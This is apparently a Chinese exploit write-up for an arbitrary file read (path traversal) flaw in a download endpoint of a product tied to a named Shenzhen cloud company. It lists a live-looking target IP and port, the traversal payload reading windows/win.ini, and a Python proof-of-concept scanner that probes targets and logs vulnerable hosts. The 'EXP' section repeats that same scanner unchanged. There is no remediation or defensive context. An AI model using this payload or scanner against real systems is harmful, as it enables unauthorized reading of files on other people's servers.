## 一、资产搜索

```
"深圳银澎云计算有限公司"
```

## 二、网站测试

```
http://118.122.48.169:18080
```

## 三、验证漏洞

```
/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
```

![image-20240906220152065](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240906220152065.png)

## 四、POC

```
payload = "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "[fonts]" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    print(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True

            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞\n")
        else:
            print("连接超时，请手动测试")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def poc(target):
    payload = "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "[fonts]" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    print(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True

            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞\n")
        else:
            print("连接超时，请手动测试")
    except Exception as e:
        print(e)
```

## 六、测试结果

![image-20240906221038082](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240906221038082.png)

![image-20240906215238327](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240906215238327.png)